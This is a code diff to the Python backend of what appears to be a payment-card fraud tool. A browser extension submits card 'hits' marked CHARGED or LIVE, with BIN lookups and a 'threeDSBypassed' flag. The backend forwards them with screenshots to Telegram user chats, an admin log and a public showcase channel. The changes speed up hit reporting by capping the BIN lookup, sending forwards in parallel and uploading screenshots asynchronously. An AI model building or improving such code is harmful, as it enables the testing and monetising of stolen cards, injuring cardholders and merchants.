@@ -1,6 +1,8 @@
 """Data routes — hit submission (status + screenshot) and forwarding to Telegram."""
 from __future__ import annotations
 
+import asyncio
+import html
 import logging
 import re
 import uuid
@@ -149,6 +151,7 @@ class StatusBody(BaseModel):
     invoiceUrl: Optional[str] = None
     invoiceNumber: Optional[str] = None
     screenshot: Optional[str] = None  # base64 JPEG (may be included with status too)
+    submitId: Optional[str] = None  # v2.9.1: client-generated id so the async screenshot follow-up finds this hit
     fingerprint: Optional[str] = None
     threeDSBypassed: Optional[Any] = None
 
@@ -197,6 +200,9 @@ class ScreenshotBody(BaseModel):
     screenshot: str  # base64 JPEG
     fingerprint: Optional[str] = None
     hitId: Optional[str] = None  # tie to a prior hit record if provided
+    submitId: Optional[str] = None  # v2.9.1: client-generated submission id
+    status: Optional[str] = None   # for the follow-up caption (LIVE hits aren't persisted)
+    siteUrl: Optional[str] = None
 
 
 def _extract_card(card_raw) -> dict:
@@ -294,7 +300,14 @@ async def submit_status(
     card = _extract_card(body.card)
     number = card.get("number") or ""
     bin_code = number[:8] if number else None
-    bin_info = await lookup_bin(bin_code) if bin_code else None
+    # v2.9.1: hard-cap the BIN lookup so a slow bin API can never delay the
+    # hit save / Telegram notification path (speed >> BIN metadata).
+    bin_info = None
+    if bin_code:
+        try:
+            bin_info = await asyncio.wait_for(lookup_bin(bin_code), timeout=2.5)
+        except Exception:
+            bin_info = None
 
     status_norm = (body.status or "").lower()
     is_charged = status_norm in ("charged", "success", "approved", "succeeded", "captured")
@@ -361,6 +374,7 @@ async def submit_status(
         ip=_extract_client_ip(request),
         ip_country=(request.headers.get("cf-ipcountry") or request.headers.get("x-country") or None),
         screenshot_b64=body.screenshot if is_charged else None,  # only store screenshot for charged
+        submit_id=body.submitId,
         from_outdated_ext=from_outdated_ext,
         ext_sent_version=outdated_sent_v if from_outdated_ext else None,
     )
@@ -466,47 +480,53 @@ async def submit_status(
         except Exception as e:
             log.warning("outbox enqueue (%s) failed: %s", key_prefix, e)
 
-    # Forward to user (pin charged messages in the user's chat).
-    await _enqueue_forward(user.telegram_id, text, pin=is_charged, key_prefix="user")
+    # v2.9.1: all forward destinations are enqueued in PARALLEL (was serial —
+    # each outbox insert is a Mongo round trip, so 3-5 destinations added
+    # hundreds of ms to the API critical path before the response).
+    async def _fwd_admin_or_owner() -> None:
+        # SILENT admin log — for non-admin users' hits:
+        #   CHARGED → pinned, with screenshot
+        #   LIVE / 3DS-LIVE (incl. live-class variants like insufficient) → NOT
+        #   pinned, but still with screenshot when available.
+        # Admin's own hits stay in admin's DM only (already sent above).
+        if not is_admin and (is_charged or is_live):
+            try:
+                admin_text = format_hit(hit_dict, user_dict, admin_view=True)
+            except Exception as _e:
+                log.error("admin format_hit failed, using fallback: %s", _e)
+                admin_text = f"⚜️ <b>SEMEX</b> — {_fallback_st} ✅ (formatting error — see dashboard)"
+            await _enqueue_forward(settings.ADMIN_LOG_CHANNEL_ID, admin_text,
+                                   pin=is_charged, with_photo=True, key_prefix="admin")
+        # OWNER DM MIRROR — when a promoted admin (not the owner) fires a CHARGED
+        # hit, the owner gets a personal DM copy so nothing slips past them.
+        # LIVE hits are NOT mirrored (public + user DM only).
+        elif is_charged and user.telegram_id != settings.ADMIN_TELEGRAM_ID:
+            try:
+                admin_text = format_hit(hit_dict, user_dict, admin_view=True)
+            except Exception as _e:
+                log.error("owner mirror format_hit failed, using fallback: %s", _e)
+                admin_text = "⚜️ <b>SEMEX</b> — CHARGED ✅ (formatting error — see dashboard)"
+            await _enqueue_forward(settings.ADMIN_TELEGRAM_ID, admin_text,
+                                   pin=False, key_prefix="owner")
 
-    # SILENT admin log — for non-admin users' hits:
-    #   CHARGED → pinned, with screenshot
-    #   LIVE / 3DS-LIVE (incl. live-class variants like insufficient) → NOT pinned,
-    #   but still with screenshot when available.
-    # Admin's own hits stay in admin's DM only (already sent above).
-    if not is_admin and (is_charged or is_live):
-        try:
-            admin_text = format_hit(hit_dict, user_dict, admin_view=True)
-        except Exception as _e:
-            log.error("admin format_hit failed, using fallback: %s", _e)
-            admin_text = f"⚜️ <b>SEMEX</b> — {_fallback_st} ✅ (formatting error — see dashboard)"
-        await _enqueue_forward(settings.ADMIN_LOG_CHANNEL_ID, admin_text,
-                               pin=is_charged, with_photo=True, key_prefix="admin")
+    async def _fwd_public() -> None:
+        # PUBLIC SHOWCASE — for both CHARGED and LIVE hits, if channel configured.
+        # Public info only: user (masked), status, gateway, response. NO card/amount/email.
+        # Admin can mute individual users from the public feed via public_muted=True.
+        if should_forward and settings.PUBLIC_SHOWCASE_CHANNEL_ID and not getattr(user, "public_muted", False):
+            try:
+                public_text = format_public_showcase(hit_dict, user_dict)
+                await telegram_outbox.enqueue_message(
+                    db, int(settings.PUBLIC_SHOWCASE_CHANNEL_ID), public_text,
+                    dedup_key=f"{forward_id}:public:text")
+            except Exception as e:
+                log.warning("public showcase enqueue failed: %s", e)
 
-    # OWNER DM MIRROR — when a promoted admin (not the owner) fires a CHARGED hit,
-    # the owner still wants to see it. The private admin-log channel is skipped for
-    # admin-generated hits (above), but the owner gets a personal DM copy so
-    # nothing slips past them. LIVE hits are NOT mirrored (public + user DM only).
-    elif is_charged and user.telegram_id != settings.ADMIN_TELEGRAM_ID:
-        try:
-            admin_text = format_hit(hit_dict, user_dict, admin_view=True)
-        except Exception as _e:
-            log.error("owner mirror format_hit failed, using fallback: %s", _e)
-            admin_text = "⚜️ <b>SEMEX</b> — CHARGED ✅ (formatting error — see dashboard)"
-        await _enqueue_forward(settings.ADMIN_TELEGRAM_ID, admin_text,
-                               pin=False, key_prefix="owner")
-
-    # PUBLIC SHOWCASE — for both CHARGED and LIVE hits, if channel configured.
-    # Public info only: user (masked), status, gateway, response. NO card/amount/email.
-    # Admin can mute individual users from the public feed via public_muted=True.
-    if should_forward and settings.PUBLIC_SHOWCASE_CHANNEL_ID and not getattr(user, "public_muted", False):
-        try:
-            public_text = format_public_showcase(hit_dict, user_dict)
-            await telegram_outbox.enqueue_message(
-                db, int(settings.PUBLIC_SHOWCASE_CHANNEL_ID), public_text,
-                dedup_key=f"{forward_id}:public:text")
-        except Exception as e:
-            log.warning("public showcase enqueue failed: %s", e)
+    await asyncio.gather(
+        _enqueue_forward(user.telegram_id, text, pin=is_charged, key_prefix="user"),
+        _fwd_admin_or_owner(),
+        _fwd_public(),
+    )
 
     # Now that the durable delivery work exists, persist the CHARGED hit. Doing
     # the insert AFTER the enqueues means a crash between the two can only ever
@@ -527,20 +547,58 @@ async def submit_status(
 
 
 @router.post("/screenshot")
-async def submit_screenshot(body: ScreenshotBody, user: User = Depends(get_current_user)):
-    """Fallback screenshot endpoint — used when screenshot uploaded separately from status."""
+async def submit_screenshot(body: ScreenshotBody, user: User = Depends(get_current_user_allow_expired)):
+    """Async screenshot follow-up (v2.9.1). The extension submits the hit
+    INSTANTLY (no screenshot) and uploads the capture a moment later, so the
+    Telegram notification is never delayed by screenshot capture. Here we
+    attach the shot to the hit row and enqueue the photo follow-ups (user DM +
+    admin log) through the durable outbox."""
     if not body.screenshot:
         raise HTTPException(400, "Missing screenshot")
 
     db = get_db()
-    # Attach to last recent hit if not provided
+    hit = None
     if body.hitId:
         try:
             from bson import ObjectId
-            await db.hits.update_one(
-                {"_id": ObjectId(body.hitId), "telegram_id": user.telegram_id},
-                {"$set": {"screenshot_b64": body.screenshot}},
-            )
+            hit = await db.hits.find_one({"_id": ObjectId(body.hitId), "telegram_id": user.telegram_id})
+        except Exception:
+            hit = None
+    if hit is None and body.submitId:
+        try:
+            hit = await db.hits.find_one({"telegram_id": user.telegram_id, "submit_id": body.submitId})
+        except Exception:
+            hit = None
+    if hit is not None:
+        try:
+            await db.hits.update_one({"_id": hit["_id"]}, {"$set": {"screenshot_b64": body.screenshot}})
         except Exception:
             pass
+
+    # Photo follow-up caption — short, always under Telegram's 1024 cap. LIVE
+    # hits are never persisted, so fall back to request fields when no hit row.
+    hitd = hit or {}
+    status_up = ((body.status or hitd.get("status") or "HIT")).upper()
+    site = body.siteUrl or hitd.get("site_url") or hitd.get("hostname") or ""
+    card_num = hitd.get("card_number") or ""
+    card4 = ("…" + card_num[-4:]) if card_num else ""
+    caption = f"⚜️ <b>SEMEX</b> — {html.escape(status_up)} 📸"
+    if card4:
+        caption += f"\n⚜️Card ➔ <code>{html.escape(card4)}</code>"
+    if site:
+        caption += f"\n⚜️Site ➔ {html.escape(str(site))[:120]}"
+
+    shot_key = body.submitId or body.hitId or uuid.uuid4().hex
+    is_admin = user.is_admin or (user.telegram_id == settings.ADMIN_TELEGRAM_ID)
+    tasks = [
+        telegram_outbox.enqueue_photo(db, user.telegram_id, body.screenshot, caption,
+                                      dedup_key=f"shot:{shot_key}:user")
+    ]
+    if not is_admin:
+        tasks.append(
+            telegram_outbox.enqueue_photo(db, settings.ADMIN_LOG_CHANNEL_ID, body.screenshot, caption,
+                                          dedup_key=f"shot:{shot_key}:admin")
+        )
+    await asyncio.gather(*tasks)
+    telegram_outbox.kick()
     return {"success": True}
